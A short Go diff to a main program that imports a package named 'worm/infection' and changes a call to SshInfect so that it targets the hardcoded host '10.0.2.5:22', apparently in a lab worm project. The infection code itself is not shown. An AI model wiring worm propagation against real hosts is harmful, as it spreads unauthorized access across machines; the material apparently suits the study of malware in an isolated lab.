@@ -2,11 +2,11 @@ package main
 
 import (
 	"fmt"
+
 	"github.com/99graciamanel/mlw/worm/infection"
 )
 
 func main() {
-	// Get a greeting message and print it.
-	message := infection.SshInfect()
+	message := infection.SshInfect("10.0.2.5:22")
 	fmt.Println(message)
 }
